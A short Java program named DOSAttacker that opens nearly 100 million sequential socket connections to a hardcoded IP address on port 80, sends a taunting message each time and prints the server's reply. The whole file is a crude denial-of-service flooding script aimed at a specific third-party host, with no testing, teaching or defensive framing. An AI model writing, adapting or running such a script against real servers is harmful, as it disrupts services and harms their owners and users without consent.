package Test;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.Socket;

public class DOSAttacker {
    public static void main(String[] args) {
        String targetIP = "60.9.6.114";
        int targetPort = 80;
        for (int i = 0; i < 99999999; i++){
            try {
                Socket socket = new Socket(targetIP,targetPort);
    
                BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()));
                PrintWriter out = new PrintWriter(socket.getOutputStream(), true);
    
                out.println("Good Morning Happy PIPO :)b Hope you enjoy this");
                String response = in.readLine();
                System.out.println("Server said: " + response);
                socket.close();
    
            } catch (IOException e) {
                throw new RuntimeException(e);
            }
        }
    }   
}
